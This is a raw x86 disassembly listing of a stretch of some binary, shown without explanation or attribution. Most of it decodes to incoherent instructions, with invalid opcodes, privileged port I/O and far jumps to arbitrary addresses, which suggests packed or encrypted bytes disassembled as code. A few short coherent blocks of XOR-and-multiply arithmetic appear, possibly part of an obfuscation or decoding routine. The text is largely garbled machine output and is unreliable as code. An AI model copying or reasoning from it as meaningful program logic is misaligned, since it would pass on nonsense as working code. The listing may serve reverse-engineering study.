  4041ca:	lods   eax,DWORD PTR ds:[esi]
  4041cb:	adc    al,0x4d
  4041cd:	popa   
  4041ce:	xchg   ebp,eax
  4041cf:	sbb    esi,eax
  4041d1:	fwait
  4041d2:	je     0x4041da
  4041d4:	imul   ecx,DWORD PTR [eax+0x1e],0x22bc4b63
  4041db:	aad    0x19
  4041dd:	stos   BYTE PTR es:[edi],al
  4041de:	lea    esp,[ebx+edx*1+0x1bbcfca7]
  4041e5:	sbb    dh,dh
  4041e7:	lea    ecx,[ebp+0x77]
  4041ea:	sbb    eax,DWORD PTR [ebx+0x57]
  4041ed:	ins    BYTE PTR es:[edi],dx
  4041ee:	retf   
  4041ef:	outs   dx,BYTE PTR ds:[esi]
  4041f0:	scas   eax,DWORD PTR es:[edi]
  4041f1:	adc    edi,eax
  4041f3:	mov    ah,0xb7
  4041f5:	dec    ebp
  4041f6:	fs test eax,0x27813fbc
  4041fc:	dec    edx
  4041fd:	call   0x67d19ecc
  404202:	mov    eax,ds:0x3692c24c
  404207:	jno    0x40427f
  404209:	push   es
  40420a:	jne    0x4041a7
  40420c:	in     eax,0xd1
  40420e:	mov    WORD PTR [esi-0x6a5e3531],cs
  404214:	dec    edx
  404215:	outs   dx,BYTE PTR ds:[esi]
  404216:	not    dl
  404218:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40421a:	xchg   ebx,eax
  40421b:	xchg   edx,eax
  40421c:	pop    eax
  40421d:	inc    esi
  40421e:	and    BYTE PTR [ecx+0x38c128ad],0x48
  404225:	xchg   ebp,eax
  404226:	cmp    BYTE PTR [eax+0x756ff1bd],0x77
  40422d:	call   0x6462e67e
  404232:	jmp    0x404296
  404234:	stos   DWORD PTR es:[edi],eax
  404235:	xor    BYTE PTR [edx+0x34a05a19],ah
  40423b:	pop    ss
  40423c:	or     esi,ecx
  40423e:	or     al,0x5d
  404240:	xor    DWORD PTR [edi],ebx
  404242:	mov    ecx,eax
  404244:	lods   eax,DWORD PTR ds:[esi]
  404245:	cwde   
  404246:	push   ebx
  404247:	out    0xb8,al
  404249:	fst    QWORD PTR [esp+eax*2+0x33]
  40424d:	shl    BYTE PTR [ebx],1
  40424f:	clc    
  404250:	jmp    0x4043fa
  404255:	xchg   ebp,eax
  404256:	push   0xffffffb8
  404258:	int3   
  404259:	jns    0x404237
  40425b:	imul   eax,DWORD PTR gs:[ebp+eax*4+0x27],0x15
  404261:	in     eax,dx
  404262:	popa   
  404263:	aad    0x86
  404265:	in     eax,dx
  404266:	push   ss
  404267:	jle    0x4042e7
  404269:	mov    edi,DWORD PTR [edi+0x7e]
  40426c:	jle    0x40428e
  40426e:	mov    BYTE PTR [ebx+0x7c],dh
  404271:	xor    ebx,DWORD PTR fs:[ecx]
  404274:	clc    
  404275:	lods   al,BYTE PTR ds:[esi]
  404276:	xchg   BYTE PTR [ecx+0xf0f049],dh
  40427c:	adc    esi,DWORD PTR [edx-0x4e0b4c7a]
  404282:	icebp  
  404283:	mov    fs,WORD PTR [edx-0x76]
  404286:	jne    0x404288
  404288:	loop   0x4042b5
  40428a:	xchg   esp,eax
  40428b:	repz xlat BYTE PTR ds:[ebx]
  40428d:	push   cs
  40428e:	and    BYTE PTR [esi-0x20],0x59
  404292:	xor    al,0x35
  404294:	mov    cl,0x9a
  404296:	mov    bh,0x41
  404298:	in     al,dx
  404299:	or     eax,0xdf736e55
  40429e:	pop    esi
  40429f:	in     al,dx
  4042a0:	mov    esi,0x2ea3c2
  4042a5:	jl     0x40425b
  4042a7:	xchg   ecx,eax
  4042a8:	fistp  QWORD PTR [edx+0x5c19f964]
  4042ae:	cld    
  4042af:	das    
  4042b0:	cmp    bh,BYTE PTR [edx]
  4042b2:	out    0x25,al
  4042b4:	inc    edi
  4042b5:	loope  0x4042a0
  4042b7:	lods   al,BYTE PTR ds:[esi]
  4042b8:	sub    edx,DWORD PTR [ecx-0x39]
  4042bb:	imul   BYTE PTR [esi-0x53]
  4042be:	push   ds
  4042bf:	sar    BYTE PTR [edi],0xfd
  4042c2:	fsub   DWORD PTR [edi+eax*8]
  4042c5:	nop
  4042c6:	cs cmp al,0xba
  4042c9:	leave  
  4042ca:	out    0xbc,eax
  4042cc:	imul   ebx,DWORD PTR [ebx+eiz*1+0x3b],0x656df78f
  4042d4:	mov    bh,0x21
  4042d6:	retf   0xe0eb
  4042d9:	xchg   BYTE PTR [esi],dl
  4042db:	adc    esp,esp
  4042dd:	add    eax,0x803ae72f
  4042e2:	sbb    cl,BYTE PTR [ebx-0x51]
  4042e5:	mov    ebp,0xd1b2b687
  4042ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042eb:	push   ds
  4042ec:	test   BYTE PTR [ebp-0x1d],ah
  4042ef:	in     eax,0x94
  4042f1:	xchg   esp,eax
  4042f2:	jno    0x4042f9
  4042f4:	mov    ebp,DWORD PTR [eax]
  4042f6:	xor    al,0x2a
  4042f8:	inc    esp
  4042f9:	and    cl,ch
  4042fb:	mov    WORD PTR [edx-0x7f787ae0],?
  404301:	push   cs
  404302:	retf   
  404303:	and    eax,0x9ba262be
  404308:	mov    ebp,0x181b3548
  40430d:	fdivr  QWORD PTR [ebx-0x66a6ebfa]
  404313:	mov    cl,0x29
  404315:	(bad)  
  404317:	lods   eax,DWORD PTR ds:[esi]
  404318:	pop    edi
  404319:	xchg   edi,eax
  40431a:	fcomp  QWORD PTR [edi]
  40431c:	inc    ah
  40431e:	adc    BYTE PTR [eax],0xde
  404321:	into   
  404322:	addr16 ret 
  404324:	and    al,0x65
  404326:	mov    DWORD PTR [ebp+0x902edb8],edi
  40432c:	jp     0x404386
  40432e:	dec    edx
  40432f:	mov    edi,DWORD PTR [esi]
  404331:	jns    0x40430f
  404333:	pop    ebx
  404334:	inc    eax
  404335:	sbb    ebx,DWORD PTR [eax+ecx*2+0x7f]
  404339:	fwait
  40433a:	cwde   
  40433b:	inc    eax
  40433c:	pop    ebx
  40433d:	dec    ecx
  40433e:	das    
  40433f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404340:	xchg   esp,eax
  404341:	arpl   WORD PTR [ebp-0x30b900ec],dx
  404347:	cmp    al,0x84
  404349:	add    DWORD PTR ds:0x6370ef4c,ebx
  40434f:	push   edx
  404350:	cdq    
  404351:	jge    0x404384
  404353:	iret   
  404354:	mov    eax,0x18fccac0
  404359:	adc    BYTE PTR ds:0xd01df8a8,0x24
  404360:	xor    DWORD PTR [ecx+0x7a],ebp
  404363:	in     eax,0x0
  404365:	mov    dh,BYTE PTR [ecx+eax*8+0xf4b12bb]
  40436c:	pop    es
  40436d:	js     0x4043c4
  40436f:	xchg   edx,eax
  404370:	jl     0x4043e6
  404372:	aam    0x1a
  404374:	sub    DWORD PTR [ebx],0xffffffcc
  404377:	push   ebp
  404378:	(bad)  
  404379:	lea    esp,[ebx+0x60]
  40437c:	js     0x4043bf
  40437e:	popf   
  40437f:	out    0x80,al
  404381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404382:	dec    ebp
  404383:	out    0xbd,al
  404385:	cmp    BYTE PTR [eax+0x1c544005],cl
  40438b:	push   ebx
  40438c:	xchg   BYTE PTR [edx+ebp*2],ch
  40438f:	das    
  404390:	mov    esi,0xd1292ced
  404395:	jno    0x4043fa
  404397:	mov    edi,DWORD PTR [ebx-0x21]
  40439a:	jae    0x4043e4
  40439c:	or     esp,ebx
  40439e:	out    dx,eax
  40439f:	sbb    al,0xaf
  4043a1:	pop    edx
  4043a2:	stc    
  4043a3:	cdq    
  4043a4:	xlat   BYTE PTR ds:[ebx]
  4043a5:	dec    edi
  4043a6:	pushf  
  4043a7:	push   ds
  4043a8:	ror    esi,1
  4043aa:	mov    ebx,0x24c600bf
  4043af:	add    al,0xde
  4043b1:	lds    ebp,FWORD PTR [ecx]
  4043b3:	ja     0x404352
  4043b5:	xor    al,0xca
  4043b7:	sbb    DWORD PTR [ebx-0xd],ecx
  4043ba:	push   eax
  4043bb:	mov    cl,0x4d
  4043bd:	jmp    0x95d8:0x7f024e43
  4043c4:	data16 cld 
  4043c6:	neg    DWORD PTR [edi+0x42cb5c02]
  4043cc:	xchg   esi,eax
  4043cd:	stos   DWORD PTR es:[edi],eax
  4043ce:	or     al,0x8c
  4043d0:	jbe    0x4043c5
  4043d2:	fwait
  4043d3:	shl    DWORD PTR [eax+edx*1-0x73],cl
  4043d7:	fwait
  4043d8:	(bad)  
  4043d9:	mov    al,ds:0xa32ac145
  4043de:	fwait
  4043df:	cmp    dh,BYTE PTR [edx+ebx*1+0x4b]
  4043e3:	dec    esi
  4043e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e5:	scas   eax,DWORD PTR es:[edi]
  4043e6:	inc    eax
  4043e7:	push   es
  4043e8:	and    ecx,edi
  4043ea:	rol    DWORD PTR [ecx+0x5f],0xbb
  4043ee:	sub    DWORD PTR [edi+0x6f],edx
  4043f1:	mov    ds:0xac00072a,eax
  4043f6:	dec    edi
  4043f7:	daa    
  4043f8:	or     al,0x4c
  4043fa:	add    edi,ecx
  4043fc:	add    edx,ecx
  4043fe:	imul   edx,edi
  404401:	mov    edi,DWORD PTR [ebp-0x8]
  404404:	mov    ebx,DWORD PTR [ebp-0x10]
  404407:	sub    ebx,edi
  404409:	cmp    ebx,edx
  40440b:	ja     0x404419
  404411:	mov    edx,DWORD PTR [ebp-0x30]
  404414:	jmp    0x404613
  404419:	mov    edx,DWORD PTR [ebp-0x38]
  40441c:	mov    edi,DWORD PTR [ebp-0x4]
  40441f:	xor    edx,eax
  404421:	xor    edi,eax
  404423:	add    edi,ecx
  404425:	add    edx,ecx
  404427:	imul   edx,edi
  40442a:	mov    edi,DWORD PTR [ebp-0x8]
  40442d:	mov    ebx,DWORD PTR [ebp-0x10]
  404430:	sub    ebx,edi
  404432:	cmp    ebx,edx
  404434:	ja     0x4045ec
  40443a:	jmp    0x4045e4
  40443f:	hlt    
  404440:	mov    ah,0xbf
  404442:	add    bh,BYTE PTR [edi+0x42444505]
  404448:	pop    ecx
  404449:	mov    ds:0x142aa2df,al
  40444e:	sti    
  40444f:	jp     0x404468
  404451:	jle    0x4044d1
  404453:	mov    edi,DWORD PTR [edi+0x7e]
  404456:	jle    0x4043e2
  404458:	les    edi,FWORD PTR [ebp+0x1092c7f5]
  40445e:	xchg   ecx,eax
  40445f:	ret    0x76c4
  404462:	and    al,0x17
  404464:	pushf  
  404465:	sub    edi,DWORD PTR [ecx+0x1be18691]
  40446b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40446c:	and    BYTE PTR [edx],dh
  40446e:	sbb    al,0x19
  404470:	(bad)  
  404471:	mov    ecx,0xc9d9c518
  404476:	dec    ecx
  404477:	sbb    edi,edi
  404479:	mov    dl,0xdd
  40447b:	lods   eax,DWORD PTR ds:[esi]
  40447c:	mov    al,ds:0x68d6b939
  404481:	xchg   edx,eax
  404482:	adc    ebx,ecx
  404484:	sub    al,0x9e
  404486:	pop    eax
  404487:	add    al,0xfe
  404489:	dec    edx
  40448a:	mov    ebp,0xba92d56c
  40448f:	ins    BYTE PTR es:[edi],dx
  404490:	and    cl,cl
  404492:	push   0x57
  404494:	mov    dl,BYTE PTR [eax+0x6e6dd06a]
  40449a:	or     ebp,DWORD PTR cs:[esi+0x4a]
  40449e:	xchg   esi,eax
  40449f:	pop    esi
  4044a0:	and    BYTE PTR [eax-0x1a],ch
  4044a3:	mov    al,0xdf
  4044a5:	xchg   ecx,eax
  4044a6:	addr16 xchg ebp,eax
  4044a8:	aad    0x2f
  4044aa:	jb     0x40446e
  4044ac:	pop    ds
  4044ad:	pop    esi
  4044ae:	and    al,0x90
  4044b0:	test   eax,0x88a16267
  4044b5:	dec    esi
  4044b6:	xchg   edi,eax
  4044b7:	pop    es
  4044b8:	aaa    
  4044b9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4044bb:	pop    es
  4044bc:	sbb    eax,0x2fc224fc
  4044c1:	out    dx,al
  4044c2:	or     DWORD PTR [edi+0x59],ebp
  4044c5:	mov    BYTE PTR ss:[ecx+0x43218719],dl
  4044cc:	lods   eax,DWORD PTR ds:[esi]
  4044cd:	mul    BYTE PTR [eax+0x4f197e12]
  4044d3:	or     BYTE PTR [edx],0xc2
  4044d6:	lods   eax,DWORD PTR ds:[esi]
  4044d7:	add    edi,ebx
  4044d9:	ror    DWORD PTR [ebp-0x6],1
  4044dc:	nop
  4044dd:	cmp    esi,esp
  4044df:	xchg   ecx,eax
  4044e0:	push   0x38
  4044e2:	sub    dh,BYTE PTR ds:0xf509cc4c
  4044e8:	aam    0xa7
  4044ea:	arpl   WORD PTR [eax-0x52],sp
  4044ed:	js     0x4044cf
  4044ef:	out    0x5d,al
  4044f1:	into   
  4044f2:	outs   dx,DWORD PTR ds:[esi]
  4044f3:	(bad)  [esi-0x51]
  4044f6:	dec    ecx
  4044f7:	neg    BYTE PTR [edx+edi*4-0x2]
  4044fb:	cli    
  4044fc:	aam    0x64
  4044fe:	inc    ecx
  4044ff:	clc    
  404500:	lea    esi,[esi-0x737215de]
  404506:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404507:	and    edx,DWORD PTR [ebx]
  404509:	test   eax,0xfafc687d
  40450e:	lods   eax,DWORD PTR ds:[esi]
  40450f:	es mov ch,0x8e
  404512:	in     eax,dx
  404513:	jo     0x4044e8
  404515:	pop    edx
  404516:	ror    DWORD PTR [edi+0x2216bad1],0xa4
  40451d:	jecxz  0x4044d0
  40451f:	push   esi
  404520:	jmp    0xa3f474ff
  404525:	imul   edx,DWORD PTR [ebx-0xa],0xffffff97
  404529:	push   cs
  40452a:	test   dl,dh
  40452c:	pusha  
  40452d:	pop    es
  40452e:	inc    edi
  40452f:	pushf  
  404530:	xchg   BYTE PTR [edi],bl
  404532:	mov    esi,0x33432607
  404537:	out    dx,al
  404538:	stos   BYTE PTR es:[edi],al
  404539:	loop   0x404521
  40453b:	bound  ebx,QWORD PTR [ebp-0x44dad8ed]
  404541:	lock out dx,al
  404543:	mov    al,0xf8
  404545:	sbb    al,0x1f
  404547:	js     0x40450a
  404549:	add    eax,0x7970bb19
  40454e:	cs (bad) 
  404550:	shl    DWORD PTR [edi+0x59c3ff29],0xc9
  404557:	push   cs
  404558:	loop   0x4045ae
  40455a:	aas    
  40455b:	pop    es
  40455c:	jmp    0xf3546037
  404561:	pop    ebp
  404562:	xchg   esp,eax
  404563:	(bad)  
  404564:	stc    
  404565:	push   ebx
  404566:	ret    0xc317
  404569:	dec    edi
  40456a:	fsub   QWORD PTR [edi]
  40456c:	test   al,0xf7
  40456e:	out    0xa8,al
  404570:	adc    BYTE PTR [edi],cl
  404572:	pop    eax
  404573:	jmp    0x40458d
  404575:	and    ch,BYTE PTR [ecx]
  404577:	in     al,0xc5
  404579:	outs   dx,DWORD PTR ds:[esi]
  40457a:	mov    WORD PTR [esi+0x38],cs
  40457d:	xchg   DWORD PTR [edi],eax
  40457f:	jl     0x4045db
  404581:	xor    al,0x60
  404583:	icebp  
  404584:	sbb    bh,BYTE PTR [ecx+0x380e4e3]
  40458a:	jbe    0x40455a
  40458c:	xchg   BYTE PTR [edx+esi*2+0x4b],dl
  404590:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  404592:	adc    DWORD PTR [eax-0x50],eax
  404595:	adc    BYTE PTR [ecx+0x669f21ca],dh
  40459b:	loope  0x404583
  40459d:	cmp    esp,DWORD PTR [esi-0x4c]
  4045a0:	sub    al,0xca
  4045a2:	imul   ebx,DWORD PTR [esi+0x45b875ab],0x84362e85
  4045ac:	iret   
  4045ad:	mov    al,ds:0xe1f30472
  4045b2:	or     ch,BYTE PTR [edx+0x189443ad]
  4045b8:	dec    edi
  4045b9:	cmp    edi,esi
  4045bb:	jo     0x40461a
  4045bd:	(bad)  
  4045be:	mov    ecx,0xdf1bdf04
  4045c3:	push   cs
  4045c4:	mov    ds:0xcad8e2a2,al
  4045c9:	ins    BYTE PTR es:[edi],dx
  4045ca:	loopne 0x40463c
  4045cc:	leave  
  4045cd:	mov    ecx,0xc082bad0
  4045d2:	or     edx,0xffffffa9
  4045d5:	pop    ebp
  4045d6:	push   eax
  4045d7:	iret   
  4045d8:	sbb    ch,0x21
  4045db:	sbb    eax,0xa1e8289d
  4045e0:	pop    esi
  4045e1:	mov    DWORD PTR [eax-0x59],eax
  4045e4:	mov    edx,DWORD PTR [ebp-0x34]
  4045e7:	jmp    0x404613
  4045ec:	mov    edx,DWORD PTR [ebp-0x3c]
  4045ef:	mov    edi,DWORD PTR [ebp-0x4]
  4045f2:	xor    edx,eax
  4045f4:	xor    edi,eax
  4045f6:	add    edx,ecx
  4045f8:	add    edi,ecx
  4045fa:	imul   edx,edi
  4045fd:	mov    edi,DWORD PTR [ebp-0x8]
  404600:	mov    ebx,DWORD PTR [ebp-0x10]
  404603:	sub    ebx,edi
  404605:	cmp    ebx,edx
  404607:	mov    edx,DWORD PTR [ebp-0x38]
  40460a:	jbe    0x404613
  404610:	mov    edx,DWORD PTR [ebp-0x3c]
  404613:	mov    edi,DWORD PTR [ebp-0x4]
  404616:	xor    edi,eax
  404618:	xor    edx,eax
  40461a:	add    edi,ecx
  40461c:	add    edx,ecx
  40461e:	imul   edx,edi
  404621:	mov    DWORD PTR [ebp+0xc],edx
  404624:	mov    edx,DWORD PTR [ebp+0xc]
  404627:	mov    DWORD PTR [ebp-0x24],edx
  40462a:	mov    edx,DWORD PTR [ebp-0x8]
  40462d:	add    edx,DWORD PTR [ebp-0x40]
  404630:	mov    DWORD PTR [ebp-0x18],0xf89c8535
  404637:	mov    DWORD PTR [ebp-0x1c],edx
  40463a:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  404641:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  404648:	mov    edx,DWORD PTR [ebp-0x18]
  40464b:	xor    edx,eax
  40464d:	add    edx,ecx
  40464f:	jmp    0x404d64
  404654:	mov    edx,DWORD PTR [ebp-0x18]
  404657:	jmp    0x404801
  40465c:	dec    esi
  40465d:	(bad)  
  40465e:	(bad)  
  40465f:	push   edi
  404660:	dec    esi
  404661:	push   edi
  404662:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  404664:	xor    BYTE PTR [edx-0x205940d0],al
  40466a:	fadd   QWORD PTR [ebp+0x7e7e29f7]
  404670:	mov    edi,DWORD PTR [edi+0x7e]
  404673:	jle    0x4046aa
  404675:	nop
  404676:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404677:	cwde   
  404678:	das    
  404679:	push   edi
  40467a:	call   DWORD PTR [eax]
  40467c:	or     BYTE PTR [esi+0x32434412],0xd4
  404683:	and    DWORD PTR [ebx-0x2746b61e],edi
  404689:	adc    ebx,DWORD PTR [ebp-0x4d]
  40468c:	lgs    ebx,FWORD PTR ds:0xc65d16f2
  404693:	jg     0x4046d2
  404695:	iret   
  404696:	lods   eax,DWORD PTR ds:[esi]
  404697:	jno    0x40462c
  404699:	inc    esp
  40469a:	jae    0x40468c
  40469c:	inc    esp
  40469d:	dec    esi
  40469e:	icebp  
  40469f:	imul   edx,DWORD PTR [ebx+0x29],0x5e531ab
  4046a6:	and    al,BYTE PTR [edx+0x516ab33b]
  4046ac:	fmul   st(0),st
  4046ae:	enter  0xac66,0xd1
  4046b2:	dec    ebx
  4046b3:	xchg   edx,eax
  4046b4:	imul   ebx,DWORD PTR [ebp-0x74],0x39
  4046b8:	jp     0x40467d
  4046ba:	xor    al,ah
  4046bc:	dec    edx
  4046bd:	mov    edi,0x6a86b401
  4046c2:	aad    0x7b
  4046c4:	xchg   BYTE PTR [edi-0x5244f278],ah
  4046ca:	cmc    
  4046cb:	sub    ebp,DWORD PTR [esp+ebx*2]
  4046ce:	lock or dl,BYTE PTR [edi+ebp*8]
  4046d2:	cmp    dh,BYTE PTR [ebp+0x3a]
  4046d5:	push   cs
  4046d6:	add    ebp,DWORD PTR [edx-0xefcb703]
  4046dc:	fwait
  4046dd:	mov    dl,0x53
  4046df:	ret    
  4046e0:	adc    al,0x39
  4046e2:	ret    
  4046e3:	ret    
  4046e4:	pop    eax
  4046e5:	ror    BYTE PTR [eax+0x1a],cl
  4046e8:	jmp    FWORD PTR [ecx-0x9]
  4046eb:	add    al,ch
  4046ed:	in     eax,dx
  4046ee:	push   cs
  4046ef:	into   
  4046f0:	repz xchg ebx,eax
  4046f2:	and    al,0x5e
  4046f4:	mov    ebp,0x641344c
  4046f9:	mov    cl,bh
  4046fb:	push   ebx
  4046fc:	and    DWORD PTR [edx],eax
  4046fe:	dec    ebp
  4046ff:	test   BYTE PTR [edi+0x6f],bh
  404702:	push   eax
  404703:	add    DWORD PTR [ebp+0x6eb86aec],eax
  404709:	enter  0x8ffb,0x5f
  40470d:	jg     0x4046af
  40470f:	inc    esi
  404710:	mov    esp,gs
  404712:	mov    ebx,0x4905eb9a
  404717:	retf   
  404718:	pop    esp
  404719:	mov    bl,0x59
  40471b:	call   0x276a:0x24c8b27c
  404722:	scas   eax,DWORD PTR es:[edi]
  404723:	xchg   dh,bl
  404725:	xlat   BYTE PTR ds:[ebx]
  404726:	mov    dl,0x33
  404728:	dec    esi
  404729:	inc    ecx
  40472a:	push   ecx
  40472b:	lods   al,BYTE PTR ds:[esi]
  40472c:	jns    0x404712
  40472e:	jmp    0x9995cd3
  404733:	ds test eax,0xb375549
  404739:	cmp    DWORD PTR [ecx-0x498b222f],eax
  40473f:	scas   eax,DWORD PTR es:[edi]
  404740:	sub    cl,dh
  404742:	mov    al,cl
  404744:	jne    0x404749
  404746:	jb     0x404799
  404748:	not    BYTE PTR [ecx]
  40474a:	dec    eax
  40474b:	pop    esi
  40474c:	jnp    0x4046e4
  40474e:	sti    
  40474f:	push   ebp
  404750:	jp     0x404720
  404752:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404753:	bound  ebx,QWORD PTR [ebx-0x7304ede9]
  404759:	sub    al,cl
  40475b:	pop    ebx
  40475c:	xchg   bl,dl
  40475e:	test   BYTE PTR [ecx-0x165f87d0],cl
  404764:	shl    DWORD PTR [ebp+0x5c1f04e7],0xcf
  40476b:	(bad)  
  40476c:	inc    ebp
  40476d:	lahf   
  40476e:	test   al,0x75
  404770:	clc    
  404771:	push   ebx
  404772:	loope  0x404790
  404774:	jge    0x404765
  404776:	jae    0x4047a7
  404778:	jne    0x404768
  40477a:	or     bl,BYTE PTR [eax]
  40477c:	mov    ds:0x63554a0e,eax
  404781:	xor    eax,0x6cf595aa
  404786:	add    cl,BYTE PTR [edx]
  404788:	test   dh,ah
  40478a:	add    DWORD PTR [edi-0x66],ebx
  40478d:	pusha  
  40478e:	shl    DWORD PTR ds:0xba9e1053,0xd0
  404795:	jno    0x4047a7
  404797:	stc    
  404798:	inc    ebx
  404799:	xor    edx,DWORD PTR ds:0xa6c6676f
  40479f:	into   
  4047a0:	fnstenv [eax]
  4047a2:	retf   0xc77b
  4047a5:	mov    ch,0x9f
  4047a7:	es jmp 0x50639859
  4047ad:	lods   al,BYTE PTR ds:[esi]
  4047ae:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047b0:	mov    ds:0x1ca07997,al
  4047b5:	mov    WORD PTR [ebp-0x1e],gs
  4047b8:	test   BYTE PTR [edi+eiz*2+0x174305a0],ah
  4047bf:	xchg   ebx,eax
  4047c0:	(bad)
  4047c3:	call   0xb26c:0x5fd18616
  4047ca:	lods   al,BYTE PTR ds:[esi]
  4047cb:	shr    BYTE PTR cs:[eax-0x46cf7222],cl
  4047d2:	jns    0x404848
  4047d4:	xor    BYTE PTR [esi-0x50],ah
  4047d7:	mov    dl,0x2b
  4047d9:	jo     0x40478d
  4047db:	cmp    ah,BYTE PTR [esi]
  4047dd:	mov    esi,edi
  4047df:	xor    eax,0x7f761a0c
  4047e4:	fistp  WORD PTR [ebx]
  4047e6:	or     eax,0x4f6c7026
  4047eb:	std    
  4047ec:	inc    esp
  4047ed:	ds pop es
  4047ef:	icebp  
  4047f0:	adc    eax,0xb429e42a
  4047f5:	lock fild DWORD PTR [eax-0x73]
  4047f9:	sar    ecx,cl
  4047fb:	je     0x404846
  4047fd:	aam    0x7c
  4047ff:	pop    esp
  404800:	mov    esi,DWORD PTR [ebx]
  404802:	rol    BYTE PTR [ebx],1
  404804:	push   ebp
  404805:	in     al,dx
  404806:	mov    edi,DWORD PTR [ebp-0x1c]
  404809:	mov    dl,BYTE PTR [edx+edi*1+0x32729d]
  404810:	mov    BYTE PTR [ebp+0xf],dl
  404813:	mov    edx,DWORD PTR [ebp-0xc]
  404816:	jmp    0x4049c0
  40481b:	and    BYTE PTR [esi+0x5a2a321e],0x62
  404822:	add    WORD PTR [edx-0x6790f46],0xffe4
  40482a:	cmp    eax,0x7e7e2b04
  40482f:	mov    edi,DWORD PTR [edi+0x7e]
  404832:	jle    0x404801
  404834:	test   DWORD PTR [ecx],esi
  404836:	cs cwde 
  404838:	aam    0x2a
  40483a:	lock push ebx
  40483c:	mov    bh,0x34
  40483e:	mov    ?,esp
  404840:	xchg   ebp,eax
  404841:	sub    DWORD PTR [ebx+0x43],esi
  404844:	arpl   WORD PTR [ebx],si
  404846:	mov    eax,0x51f48c9a
  40484b:	fisttp QWORD PTR [ebp-0x1bd42e6d]
  404851:	pop    es
  404852:	cwde   
  404853:	int    0x4b
  404855:	xchg   BYTE PTR [ecx],dh
  404857:	xchg   esi,edi
  404859:	add    ecx,DWORD PTR [esi+0x41]
  40485c:	sub    al,0x58
  40485e:	lock mov bl,0x9f
  404861:	sub    BYTE PTR [ebx],0x7a
  404864:	adc    BYTE PTR [eax+0x45],cl
  404867:	dec    ebp
  404868:	fbld   TBYTE PTR [eax]
  40486a:	xchg   DWORD PTR [edi+0x6f],edi
  40486d:	mov    ch,0xf2
  40486f:	inc    ebx
  404870:	fimul  DWORD PTR [eax-0x993897d]
  404876:	mov    WORD PTR ds:0x41093706,cs
  40487c:	dec    eax
  40487d:	(bad)  
  40487e:	stos   BYTE PTR es:[edi],al
  40487f:	into   
  404880:	test   DWORD PTR [esi+0x36409d52],eax
  404886:	lock mov WORD PTR [ebp+0x73],ss
  40488a:	xchg   BYTE PTR [ecx-0x384eb864],dh
  404890:	sub    DWORD PTR [ebx-0x1c],ebx
  404893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404894:	mov    dl,0x78
  404896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404897:	cmp    ecx,DWORD PTR [ebx]
  404899:	xchg   ebp,eax
  40489a:	cmp    eax,0xe5f51830
  40489f:	cmc    
  4048a0:	sub    BYTE PTR [ebx+0x47],cl
  4048a3:	stos   BYTE PTR es:[edi],al
  4048a4:	sub    al,0x9a
  4048a6:	stos   DWORD PTR es:[edi],eax
  4048a7:	repnz adc BYTE PTR [edi],dl
  4048aa:	retf   0xeaf3
  4048ad:	pop    esi
  4048ae:	sbb    eax,0xd6f5555c
  4048b3:	adc    DWORD PTR [eax],ebp
  4048b5:	push   eax
  4048b6:	nop
  4048b7:	xchg   edi,eax
  4048b8:	mov    ebx,DWORD PTR ss:[ebx+0x4d154aba]
  4048bf:	mov    ecx,DWORD PTR [ecx-0x42]
  4048c2:	sub    BYTE PTR [ebx+0x9aafc09],bl
  4048c8:	sar    esp,1
  4048ca:	(bad)
  4048cd:	into   
  4048ce:	test   ch,ch
  4048d0:	popf   
  4048d1:	rcl    BYTE PTR [eax+edx*4-0x44],1
  4048d5:	jmp    0x40492a
  4048d7:	or     BYTE PTR [ebx],0x5c
  4048da:	jo     0x404911
  4048dc:	aaa    
  4048dd:	push   edx
  4048de:	jmp    0x3431:0x7ac97054
  4048e5:	push   cs
  4048e6:	jl     0x4048ba
  4048e8:	mov    es,WORD PTR [ecx+0x6a]
  4048eb:	fistp  QWORD PTR [edx+0x59562580]
  4048f1:	dec    esi
  4048f2:	popa   
  4048f3:	push   ebp
  4048f4:	adc    eax,0xfc858f13
  4048f9:	fwait
  4048fa:	push   cs
  4048fb:	add    al,0x4
  4048fd:	jecxz  0x40489b
  4048ff:	out    0x66,al
  404901:	jnp    0x404965
  404903:	or     dl,ah
  404905:	and    ebp,DWORD PTR [eax]
  404907:	add    ebp,ebp
  404909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40490a:	in     al,dx
  40490b:	cmp    al,0x16
  40490d:	es ret 0x9c6f
  404911:	or     esi,0xda2c6272
  404917:	or     DWORD PTR [edx-0x46fceada],ecx
  40491d:	mov    bl,0x86
  40491f:	movzx  eax,WORD PTR [edx-0x69]
  404923:	aad    0xe7
  404925:	xchg   ebp,eax
  404926:	or     BYTE PTR [eax-0x53],cl
  404929:	and    DWORD PTR [esi],0x95943bab
  40492f:	icebp  
  404930:	enter  0xde1c,0xb1
  404934:	jne    0x404910
  404936:	jg     0x404948
  404938:	jae    0x4048e2
  40493a:	sub    eax,0xddbbb59
  40493f:	pop    ebp
  404940:	scas   eax,DWORD PTR es:[edi]
  404941:	icebp  
  404942:	into   
  404943:	xor    ecx,DWORD PTR [edi+0x60]
  404946:	(bad)  
  404947:	push   ebx
  404948:	das    
  404949:	rol    DWORD PTR [ecx],cl
  40494b:	inc    esp
  40494c:	jae    0x4049b1
  40494e:	push   ss
  40494f:	inc    edx
  404950:	lds    edi,FWORD PTR [ebp+eax*4+0x8208cc7]
  404957:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404958:	fsub   st,st(3)
  40495a:	inc    ebx
  40495b:	pop    ebp
  40495c:	push   ebx
  40495d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40495e:	jne    0x404919
  404960:	ja     0x4049b3
  404962:	sub    al,0x3d
